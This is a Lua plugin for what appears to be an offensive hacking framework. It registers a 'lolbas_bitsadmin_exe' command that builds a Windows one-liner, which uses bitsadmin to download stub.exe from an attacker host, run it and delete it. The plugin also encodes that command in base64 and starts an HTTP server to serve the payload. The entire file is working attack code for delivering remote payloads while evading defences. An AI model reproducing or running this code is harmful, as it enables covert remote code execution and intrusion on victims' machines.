register_command("lolbas_bitsadmin_exe", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]
    local out_exe = "stub.exe"
    local url = "http://" .. lhost .. "/stub.exe"

    if not lhost or not lport then return "Error: set lhost and lport" end
    

    local cmd = string.format('bitsadmin /transfer A /download /priority normal %s %s && %s && del %s', url, out_exe, out_exe, out_exe)

    app.one_cmd("encodewinbase64 " .. cmd)
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")

    print("\n[🔥] One-liner (bitsadmin):")
    print("\n" .. cmd .. "\n")
    return "✅ Ready"
end)